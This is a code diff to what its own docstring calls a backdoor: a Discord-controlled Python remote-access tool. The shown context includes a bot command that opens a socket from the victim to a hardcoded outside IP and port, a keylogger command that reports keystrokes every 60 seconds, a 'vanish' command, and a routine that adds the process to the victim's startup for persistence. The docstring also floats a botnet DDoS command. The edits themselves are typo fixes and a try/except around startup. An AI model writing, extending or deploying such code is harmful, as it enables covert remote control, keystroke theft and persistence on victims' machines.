@@ -1,9 +1,9 @@
 """
 so this is my creative way to dealing with blocked sockets, multiple clients, etc. This controller will
-be persistent even if there is an exception wihtin the socket connection i can easily use the controller to
+be persistent even if there is an exception within the socket connection i can easily use the controller to
 reconnect with client. Also provides me a way to destroy this application by simply invalidating my token if this
 code is ever leaked. Basic backdoor control will be provided at this level and user can use socket connection to
-initiate more complex functionality. Depending how deep i go down this rabbit hole i might add this process to vitim
+initiate more complex functionality. Depending how deep i go down this rabbit hole i might add this process to victim
 startup file to make it persistent through restarts. may also implement a botnet ddos command which will be illegal to
 test so probably wont end up doing that unless im interested in crashing my own internet.
 """
@@ -93,7 +93,7 @@ async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
         threading.Thread(target=Client.connectToServer, args=(IP, PORT)).start()
         await ctx.send(f"Bot {botID} has opened a new socket to {IP}:{PORT} its time for anarchy!")
 
-#command for starting keylogger to report new keys ever 60 seconds:
+#command for starting keylogger to report new keys every 60 seconds:
 @bot.command("startlog")
 async def startlog(ctx):
     global activated
@@ -148,7 +148,11 @@ async def vanish(ctx):
 def start():
     bot.run(TOKEN)
 
-if __name__ == '__main__':
-    addProcToStartup()
-    start()
 
+if __name__ == '__main__':
+    try:
+        addProcToStartup()
+        start()
+    except Exception as e:
+        print("press enter to exit")
+        input()
